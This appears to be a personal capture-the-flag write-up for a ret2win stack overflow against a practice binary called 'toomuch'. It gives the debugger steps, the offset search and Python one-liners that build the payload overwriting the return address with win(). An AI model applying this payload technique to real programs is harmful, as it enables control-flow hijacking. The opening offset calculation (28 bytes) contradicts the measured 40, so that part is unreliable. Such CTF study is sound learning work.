ELF 64 bit executable 
Buffer size is  20 

| Stack Element      | Size (bytes) |
|--------------------|-------------|
| buffer (char[20]) | 20          |
| Saved RBP         | 8           |
| Return Address    | 8           |

- Total offset to RIP is 20(buffer) + 8 (saved RBP) = 28 bytes
- Need at least 28 bytes to reach RIP and 8 more bytes to overwrite
- Total buffer overflow payload should be at least 36 bytes to take control of execution
# Finding Values
### Find The Address of Win()
```bash
nm toomuch | grep " win"
```
- Output
```
0x4011d5
```
# Exploit
## Notes
- The buffer is 20 bytes because of char buffer[20]
- The saved RBP is 8 bytes
- The return address is the next 8 bytes (which we want to overwrite with win())
## Goals
- Overwrite 20 bytes of buffer
- Overwrite saved RBP (8 bytes of junk)
- Overwrite the retuyrn address (next 8 bytes) with win()
### It's a return2win attack
- Analysis with r2
```bash
r2 toomuch
```
```r2
aa
```
```r2
afl
```
- Address of win
```
0x004011d5
```
- Analysis with gdb-pwndbg
```bash
gdb-pwndbg
```
```gdb
file toomuch
```
```gdb
info functions
```
```-n 4 for 32  bit and -n 8 for 64 bit
cyclic 100 -n 8
```
- Output
```
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```
- Run the program
```gdb
run
```
- Paste in the cyclic pattern and analyze output
- Look for RIP
```
RIP  0x40131d (main+202) ◂— ret
```
- Value
```
► 0x40131d <main+202>    ret                                <0x6161616161616166>
```
```
cyclic -n 8 -l 0x6161616161616166
```
- Found
```
pwndbg> cyclic -n 8 -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```
- Grab the entry address of win()
```gdb
disas win
```
- Address
```
0x00000000004011d5
```
- Check for alignment when running with the new buffer of 40
```bash
python3 -c 'print("A" * 40 + "B" * 8 + "C" * 30)'
```
- Run the program again with that as the input for the buffer and make sure the Bs align with RIP
```bash
gdb-pwndbg ./toomuch
```
```gdb
run
```
- Output shows good alignment
```
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7fffffffdd58 ◂— 'BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
 RIP  0x40131d (main+202) ◂— ret 
──────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────
 ► 0x40131d <main+202>    ret                                <0x4242424242424242>
    ↓
```
- run the following to get the flag and remember to reverse the numbers of the address not the order
```bash
python3 -c 'print("A" * 40 + "\xd5\x11\x40\x00")' > payload
```
- USE THIS INSTEAD FOR PAYLOAD GENERATION
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 40 + b"\xd5\x11\x40\x00\x00\x00\x00\x00")' > payload
```
